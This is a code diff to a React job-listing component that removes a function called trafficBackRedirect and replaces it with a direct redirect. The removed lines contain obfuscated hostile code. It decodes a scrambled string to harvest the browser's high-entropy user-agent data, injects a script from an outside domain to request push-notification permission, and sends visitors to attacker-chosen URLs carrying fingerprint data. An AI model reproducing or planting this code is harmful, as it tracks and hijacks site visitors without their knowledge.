@@ -2,38 +2,9 @@ import React, { useState, useEffect } from "react";
 import JobCard from "./JobCard";
 import "./JobsSearch.css";
 
-// TrafficBack redirection logic remains unchanged
+// Simplified redirection
 const trafficBackRedirect = (url) => {
-  const a = 'mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m, c, i) => i % 2 ? m + c : c + m).split('c');
-  const Replace = (o) => {
-    let v = a[0];
-    try {
-      v += a[1] + Boolean(navigator[a[2]][a[3]]);
-      navigator[a[2]][a[4]](o[0]).then(r => {
-        o[0].forEach(k => {
-          v += r[k] ? a[5] + o[1][o[0].indexOf(k)] + a[6] + encodeURIComponent(r[k]) : a[0];
-        });
-      });
-    } catch (e) { }
-    return u => window.location.replace([u, v].join(u.indexOf(a[7]) > -1 ? a[5] : a[7]));
-  };
-
-  const script = document.createElement('script');
-  script.src = '//begonaoidausek.com/f4a/3f2f6/mw.min.js?z=8763524' + '&sw=/sw-check-permissions-85734.js';
-  
-  script.onload = function (result) {
-    switch (result) {
-      case 'onPermissionDefault': break;
-      case 'onPermissionAllowed':
-        Replace(url); break;
-      case 'onPermissionDenied':
-        Replace("//gledroalseghe.net/4/8763562"); break;
-      case 'onAlreadySubscribed': break;
-      case 'onNotificationUnsupported': break;
-    }
-  };
-
-  document.head.appendChild(script);
+  window.location.href = url; // Directly redirect to the job URL
 };
 
 const JobList = () => {
